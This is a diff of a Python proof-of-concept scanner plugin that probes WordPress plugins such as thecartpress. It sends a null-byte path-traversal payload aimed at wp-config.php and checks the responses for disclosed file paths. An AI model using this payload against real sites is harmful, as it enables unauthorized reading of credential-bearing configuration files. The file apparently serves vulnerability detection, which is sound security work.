@@ -6,7 +6,7 @@
 import re
 def assign(service, arg):
     if service == "wordpress":
-        return True, arg 	
+        return True, arg
 
 def audit(arg):
     payload1='wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../../../../../wp-config.php%00'
@@ -17,16 +17,19 @@ def audit(arg):
     path=re.findall(r'in <b>(.+?Miranda.class.php)</b>',res)
     if len(path)!=0:
         security_info(path[0])
+        return arg
     verify_url = arg  + payload2
     code, head, res, errcode, _ = curl.curl(verify_url)
     path=re.findall(r'in <b>(.+?sell-downloads.php)</b>',res)
     if len(path)!=0:
         security_info(path[0])
+        return arg
     verify_url = arg  + payload3
     code, head, res, errcode, _ = curl.curl(verify_url)
     path=re.findall(r'in <b>(.+?upload.php)</b>',res)
     if len(path)!=0:
         security_info(path[0])
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('wordpress','http://127.0.0.1:8080/wordpress/')[1])
